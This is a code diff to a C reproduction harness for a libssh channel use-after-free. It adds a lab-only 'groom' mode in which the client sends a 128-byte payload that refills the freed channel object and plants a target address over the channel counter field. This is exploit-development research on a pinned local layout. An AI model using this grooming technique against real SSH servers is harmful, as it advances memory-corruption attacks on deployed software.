@@ -7,6 +7,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/wait.h>
+#include <stdint.h>
+#include <sanitizer/asan_interface.h>
 #include <libssh/libssh.h>
 #include <libssh/server.h>
 #include <libssh/buffer.h>
@@ -21,6 +23,9 @@ static volatile int g_done = 0;
 static int g_send_close = 1;
 static int g_data_packets = 0;
 static int g_free_on_data = 1;
+static int g_groom = 0;
+static volatile uint64_t g_target = 0x4141414141414141ull;
+static void *g_groom_ptr = NULL;
 
 static int auth_password(ssh_session s, const char *user, const char *pass, void *u)
 {
@@ -52,7 +57,27 @@ static int on_data(ssh_session s, ssh_channel ch, void *data, uint32_t len,
          * ssh_channel_free() calls ssh_channel_do_free() because CLOSED_REMOTE
          * is already set: buffers, callbacks and the channel itself are freed
          * while channel_rcv_data() is still running. */
+        unsigned char wire[128];
+        if (g_groom && len >= 128) {
+            memcpy(wire, data, sizeof(wire));
+        }
         ssh_channel_free(ch);
+        if (g_groom && len >= 128) {
+            /* Lab-only groom: the application reuses the just-freed 128-byte
+             * channel object for a 128-byte buffer filled with bytes chosen
+             * by the authenticated peer. Offset 120 is channel->counter's
+             * slot in the pinned layout. */
+            void *p = malloc(128);
+            uint64_t v = 0;
+            if (p != NULL) {
+                memcpy(p, wire, sizeof(wire));
+                g_groom_ptr = p;
+                memcpy(&v, (char *)p + 120, sizeof(v));
+                printf("SERVER groom alloc=%p wire_off120=0x%llx target=%p\n",
+                       p, (unsigned long long)v, (void *)&g_target);
+                fflush(stdout);
+            }
+        }
         g_done = 1;
     }
     return (int)len;
@@ -123,6 +148,8 @@ static int run_server(const char *keyfile)
         ssh_event_dopoll(event, 100);
     }
     printf("SERVER done data_packets=%d\n", g_data_packets);
+    printf("SERVER target_after=0x%llx groom_ptr=%p\n",
+           (unsigned long long)g_target, g_groom_ptr);
     fflush(stdout);
     return 0;
 }
@@ -134,15 +161,20 @@ static int raw_u8(ssh_session s, uint32_t recipient, uint8_t type)
     return ssh_packet_send(s);
 }
 
-static int raw_data(ssh_session s, uint32_t recipient, const char *payload)
+static int raw_data_n(ssh_session s, uint32_t recipient, const void *payload,
+                      uint32_t n)
 {
-    uint32_t n = (uint32_t)strlen(payload);
     if (ssh_buffer_pack(s->out_buffer, "bd", SSH2_MSG_CHANNEL_DATA,
                         recipient) != SSH_OK)
         return -1;
     if (ssh_buffer_pack(s->out_buffer, "dP", n, (size_t)n, payload) != SSH_OK)
         return -1;
     return ssh_packet_send(s);
+}
+
+static int raw_data(ssh_session s, uint32_t recipient, const char *payload)
+{
+    return raw_data_n(s, recipient, payload, (uint32_t)strlen(payload));
 }
 
 static int run_client(void)
@@ -187,7 +219,20 @@ static int run_client(void)
         usleep(200000);
     }
     usleep(200000);
-    if (raw_data(s, ch->remote_channel, marker) != 0) {
+    if (g_groom) {
+        unsigned char payload[128];
+        uint64_t want = (uint64_t)(uintptr_t)&g_target;
+        memset(payload, 'M', sizeof(payload));
+        memcpy(payload, marker, strlen(marker));
+        payload[16] = '-';
+        memcpy(payload + 120, &want, sizeof(want));
+        if (raw_data_n(s, ch->remote_channel, payload, sizeof(payload)) != 0) {
+            fprintf(stderr, "raw groom data failed\n");
+            return 1;
+        }
+        printf("CLIENT sent groom wire pointer=0x%llx\n",
+               (unsigned long long)want);
+    } else if (raw_data(s, ch->remote_channel, marker) != 0) {
         fprintf(stderr, "raw data failed\n");
         return 1;
     }
@@ -200,18 +245,34 @@ static int run_client(void)
     return 0;
 }
 
+static void asan_death(void)
+{
+    printf("SERVER death target=0x%llx\n",
+           (unsigned long long)g_target);
+    fflush(stdout);
+}
+
 int main(int argc, char **argv)
 {
     ssh_set_log_level(SSH_LOG_PROTOCOL);
+    __asan_set_death_callback(asan_death);
     ssh_init();
     pid_t pid;
     if (argc < 2 || argc > 3) {
-        fprintf(stderr, "usage: %s hostkey [data-only]\n", argv[0]);
+        fprintf(stderr, "usage: %s hostkey [data-only|no-free|groom]\n",
+                argv[0]);
         return 2;
     }
     if (argc == 3 && strcmp(argv[2], "data-only") == 0) {
         g_send_close = 0;
         g_free_on_data = 0;
+    } else if (argc == 3 && strcmp(argv[2], "no-free") == 0) {
+        g_free_on_data = 0;
+    } else if (argc == 3 && strcmp(argv[2], "groom") == 0) {
+        g_groom = 1;
+    } else if (argc == 3) {
+        fprintf(stderr, "unknown mode: %s\n", argv[2]);
+        return 2;
     }
     pid = fork();
     if (pid == 0) {
